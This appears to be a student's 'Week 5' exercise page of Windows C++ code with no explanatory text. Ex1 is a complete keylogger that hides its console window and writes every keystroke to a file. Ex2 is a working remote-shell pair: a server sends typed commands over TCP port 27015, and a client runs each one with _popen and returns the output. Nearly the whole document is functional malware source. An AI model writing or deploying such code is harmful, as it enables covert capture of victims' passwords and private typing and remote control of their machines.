# Week 5

## Ex1

```
#include <windows.h>
#include <iostream>
#include <fstream>
#include <algorithm>
using namespace std;
void SaveKey(string key)
{
    fstream File;
    File.open("data.txt", ios ::app);
    File << key;
    File.close();
}
string TransKey(int key)
{
    string ans;
    if (key == VK_SHIFT)
    {
        ans = "[SHIFT]";
    }
    if (key == VK_CONTROL)
    {
        ans = "[CTRL]";
    }
    if (key == VK_MENU)
    {
        ans = "[ALT]";
    }
    if (key == VK_CAPITAL)
    {
        ans = "[CAPLOCK]";
    }
    if (key == VK_RETURN)
    {
        ans = "[ENTER]";
    }
    if (key == VK_TAB)
    {
        ans = "[TAB]";
    }
    if (key == VK_BACK)
    {
        ans = "[BACKSPACE]";
    }
    if (key == VK_DELETE)
    {
        ans = "[DEL]";
    }
    if (key == VK_SPACE)
    {
        ans = "[SPACE]";
    }
    return ans;
}
int main()
{
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    int spec[] = {VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL, VK_RETURN, VK_TAB, VK_BACK, VK_DELETE, VK_SPACE};
    bool ok;
    while (true)
    {
        for (int i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                if (find(begin(spec), end(spec), i) != end(spec))
                {
                    SaveKey(TransKey(i));
                }
                else
                {
                    if (GetKeyState(VK_CAPITAL))
                    {
                        if (GetAsyncKeyState(VK_SHIFT))
                        {
                            SaveKey(string(1, tolower(i)));
                        }
                        else
                        {
                            SaveKey(string(1, (char)i));
                        }
                    }
                    else
                    {
                        if (GetAsyncKeyState(VK_SHIFT))
                        {
                            SaveKey(string(1, (char)i));
                        }
                        else
                        {
                            SaveKey(string(1, tolower(i)));
                        }
                    }
                }
            }
        }
    }
    return 0;
}
```

## Ex2

- Server

```
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET ListeningSocket, NewConnection;
    SOCKADDR_IN ServerAddr;
    int Port = 27015;
    char recvbuf[1024];
    int BytesReceived;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_port = htons(Port);
    ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
    bind(ListeningSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
    listen(ListeningSocket, 1);
    NewConnection = accept(ListeningSocket, NULL, NULL);
    std::string cmd;
    do
    {
        std::cin >> cmd;
        send(NewConnection, cmd.c_str(), cmd.size() + 1, 0);
        BytesReceived = recv(NewConnection, recvbuf, 1024, 0);
        printf(recvbuf);
    } while (1);
    closesocket(NewConnection);
    closesocket(ListeningSocket);
    WSACleanup();
    return 0;
}
```

- Client

```
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <windows.h>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET ConnectSocket;
    SOCKADDR_IN ClientService;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ClientService.sin_family = AF_INET;
    ClientService.sin_addr.s_addr = inet_addr("127.0.0.1");
    ClientService.sin_port = htons(27015);
    connect(ConnectSocket, (SOCKADDR*)&ClientService, sizeof(ClientService));
    char recvbuf[1024];
    do
    {
        int BytesReceived = recv(ConnectSocket, recvbuf, 1024, 0);
        std::string cmd(recvbuf, BytesReceived);
        std::string output;
        FILE* pipe = _popen(cmd.c_str(), "r");
        char buffer[128];
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                output += buffer;
        }
        _pclose(pipe);
        send(ConnectSocket, output.c_str(), output.size() + 1, 0);
    } while (1);
    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}
```
